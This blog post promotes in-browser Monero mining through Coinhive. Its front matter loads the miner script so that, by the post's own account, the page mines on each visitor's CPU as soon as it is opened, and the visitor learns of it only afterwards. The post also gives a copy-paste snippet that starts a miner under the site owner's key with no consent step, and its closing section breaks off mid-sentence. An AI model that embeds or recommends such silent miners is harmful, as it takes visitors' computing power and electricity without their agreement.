---
layout: post
title: Mine Monero in Browser
excerpt: "Mine Monero just by visiting your a website."
image: "images/daria-sukhorukova-6338.jpg"
imageattribution: "Daria Sukhorukova"
imageattributionlink: https://unsplash.com/@dariasukhorukova
tags:
  - guide
  - blog
script: "miner.js"
externalscript: "https://coin-hive.com/lib/coinhive.min.js"
---

## Current State of the Free Web

**Ads suck.**

I've blogged about ads before and how to use [Google AdSense][0].
I have AdSense enabled on this site and it earns next to nothing.
It's intrusive and a lot of people view it negatively.

However, there aren't many non intrusive alternatives. But here is one.

## Monero Mining

Monero is a blockchain based currency that has a strong emphasis on privacy.
It's constantly under development and seeing steady increases in value.

[Coinhive][1] has created a Javascript Monero mining solution that enables websites to earn money without affecting the visual representation of the site.
Mining Monero requires some computation on the users CPU, and the successes from mining are fed directly back into the account of the website owner.

Since you're on this page, you're mining Monero for me right now.

**Thank you for supporting me!**

*Unless your ad blocker is blocking it! Oh no! Check below to find out.*

## Implementation

Implementation is trivial. Simply include the Coinhive script on your page, and call the start function.

```
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
	// Replace this with your 'site key'.
	var miner = new CoinHive.Anonymous('MCtA4Mc6TUNeLD9cOrkuPw06B2Ulz4Ic');
	miner.start();
</script>
```

They also offer callbacks so you can display this information to the user, like this:

> Hashes per Second: **<span id="hashesPerSecond">Loading...</span>**
>  
> Total Hashes: **<span id="totalHashes">Loading...</span>**
>  
> Accepted Hashes: **<span id="acceptedHashes">Loading...</span>**

<button id="toggleMiner" disabled="true">Loading...</button>

If this doesn't update for you, you probably have an ad blocker installed that is blocking the miner.

## Future Work

The major downside of this is that this causes a huge utilisation on the CPU.
While most agree they prefer this solution over ads, this can still be viewed as exploiting users without providing them anything in return, (not including your site content).

Coinhive has a deep API that allows you to associate mining with particular users so you can record the number of hashes provided and in return provide the user with rewards.

The [real world use case][2] on the Coinhive website is an incredibly persuasive example of this.

## Closing

Over the next couple of *time periods* you may see a transistion

[0]: https://www.google.com/adsense
[1]: https://coin-hive.com/
[2]: https://coin-hive.com/#use-case
